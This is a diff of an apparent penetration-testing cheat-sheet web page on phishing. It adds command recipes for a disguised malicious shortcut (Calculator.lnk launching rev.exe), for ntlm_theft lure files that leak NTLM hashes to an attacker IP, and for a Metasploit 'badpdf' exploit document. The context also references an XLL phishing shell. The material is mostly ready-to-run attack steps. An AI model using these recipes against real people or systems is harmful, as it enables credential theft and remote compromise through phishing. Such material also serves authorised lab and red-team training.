@@ -54,9 +54,18 @@
   
   <li><a href="https://tldrbins.github.io/@vba/">Vba</a></li>
   
+  <li><a href="https://tldrbins.github.io/@ntlm_theft/">Ntlm_theft</a></li>
+  
 </ul>
 
 <div class="content"><hr>
+<h3 id="create-malicious-lnk">Create malicious .lnk</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$obj</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="n">WScript</span><span class="p">.</span><span class="py">Shell</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$link</span> <span class="p">=</span> <span class="nv">$obj</span><span class="p">.</span><span class="py">CreateShortcut</span><span class="p">(</span><span class="s2">&#34;C:\Windows\Tasks\Calculator.lnk&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$link</span><span class="p">.</span><span class="py">TargetPath</span> <span class="p">=</span> <span class="s2">&#34;C:\windows\tasks\rev.exe&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$link</span><span class="p">.</span><span class="py">Save</span><span class="p">()</span>
+</span></span></code></pre></div><br>
+<hr>
 <h3 id="phishing-with-xll-excel">Phishing with XLL (Excel)</h3>
 <p><a href="https://www.revshells.com/">revshells.com</a></p>
 <h4 id="shellc">shell.c</h4>
@@ -148,6 +157,19 @@
 </span></span><span class="line"><span class="cl"><span class="p">|</span>5. <span class="s2">&#34;Events&#34;</span> &gt; <span class="s2">&#34;Open Document&#34;</span> &gt; <span class="s2">&#34;OK&#34;</span>                     <span class="p">|</span>
 </span></span><span class="line"><span class="cl"><span class="p">|</span>6. <span class="s2">&#34;SAVE&#34;</span>                                                <span class="p">|</span>
 </span></span><span class="line"><span class="cl">+---------------------------------------------------------+
+</span></span></code></pre></div><br>
+<hr>
+<h3 id="phishing-with-multiple-file-types">Phishing with multiple file types</h3>
+<p><a href="https://github.com/Greenwolf/ntlm_theft">ntlm_theft</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 ntlm_theft.py -g all -s 10.10.14.10 -f <span class="nb">test</span>
+</span></span></code></pre></div><br>
+<hr>
+<h3 id="create-malicious-pdf-file">Create malicious pdf file</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -q
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">search badpdf
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> filename evil.pdf
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> lhost 10.10.14.10
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">exploit
 </span></span></code></pre></div><br></div></div>
     
     <script src="/js/utils.js"></script>
